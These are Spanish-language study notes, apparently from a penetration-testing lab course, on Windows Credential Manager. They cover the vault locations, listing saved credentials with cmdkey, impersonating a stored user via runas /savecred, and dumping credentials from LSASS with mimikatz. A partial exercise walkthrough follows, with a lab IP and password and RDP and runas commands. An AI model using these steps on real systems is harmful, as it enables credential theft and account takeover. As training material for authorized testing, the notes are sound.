El Administrador de Credenciales es una función integrada en Windows Server 2008 R2 y Windows 7, que permite a usuarios y aplicaciones almacenar credenciales de forma segura (como contraseñas o tokens) para otros sistemas o sitios web.

Las credenciales se guardan cifradas dentro del perfil del usuario o del sistema en rutas como:
```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

Cada carpeta de bóveda contiene un archivo `Policy.vpol` con **claves AES (128 o 256 bits)** protegidas por **DPAPI**, usadas para cifrar las credenciales.  
Las versiones modernas de Windows utilizan **Credential Guard**, que emplea **virtualización y enclaves de memoria seguros** para proteger aún más las claves maestras de DPAPI.

Microsoft denomina a estos almacenes protegidos **Credential Lockers** (antes llamados _Windows Vaults_).
- **Administrador de Credenciales:** interfaz/API visible para el usuario.
- **Vaults o Lockers:** carpetas cifradas donde realmente se guardan las credenciales.

|Nombre|Descripción|
|---|---|
|Credenciales web|Credenciales asociadas a sitios web y cuentas en línea. Este bloqueo se utiliza en Internet Explorer y versiones anteriores de Microsoft Edge.|
|Credenciales de Windows|Se utiliza para almacenar tokens de inicio de sesión para varios servicios como OneDrive y credenciales relacionadas con usuarios de dominio, recursos de red local, servicios y directorios compartidos.|

Es posible exportar bóvedas de Windows a archivos .crd mediante el Panel de control o con el siguiente comando. Las copias de seguridad creadas de esta manera se cifran con una contraseña proporcionada por el usuario y pueden importarse a otros sistemas Windows.
```
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```

---
## Enumerating credentials with cmdkey
Podemos usar cmdkey para enumerar las credenciales almacenadas en el perfil del usuario actual:
```cmd-session
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

La primera credencial en el resultado del comando anterior, virtualapp/didlogical, es una credencial genérica utilizada por la cuenta Microsoft/servicios de Windows Live. El nombre de usuario, de apariencia aleatoria, es un ID de cuenta interno. Esta entrada puede ignorarse para nuestros fines.

La segunda credencial, Domain:interactive=SRV01\mcharles, es una credencial de dominio asociada al usuario SRV01\mcharles. Interactiva significa que la credencial se utiliza para inicios de sesión interactivos. Siempre que encontremos este tipo de credencial, podemos usar "runas" para suplantar la identidad del usuario almacenado, como se muestra a continuación:

```cmd-session
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```

---
## Extracting credentials with Mimikatz
Existen diversas herramientas que pueden usarse para descifrar las credenciales almacenadas. Una de ellas es mimikatz. Incluso dentro de mimikatz, existen múltiples maneras de atacar estas credenciales: podemos volcarlas de la memoria con el módulo sekurlsa o descifrarlas manualmente con el módulo dpapi. En este ejemplo, usaremos sekurlsa para el proceso LSASS:

```cmd-session
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
```

---

**1.  What is the password mcharles uses for OneDrive?
Target(s): 10.129.93.199 (ACADEMY-PWATTCK-CREDDEV01)   
RDP to 10.129.93.199 (ACADEMY-PWATTCK-CREDDEV01) with user "sadams" and password "totally2brow2harmon@"**

Ejecuto en Linux (atacante):
```
xfreerdp /v:10.129.93.199 /u:sadams /p:'totally2brow2harmon@'
```

En la máquina víctima de Windows, ejecuto un:
```
C:\Users\sadams>cmdkey /list

Currently stored credentials:
    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Voy a loggearme como dicho usuario con el comando:
```
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```

Ejercicio no finalizado por alta dificultad.
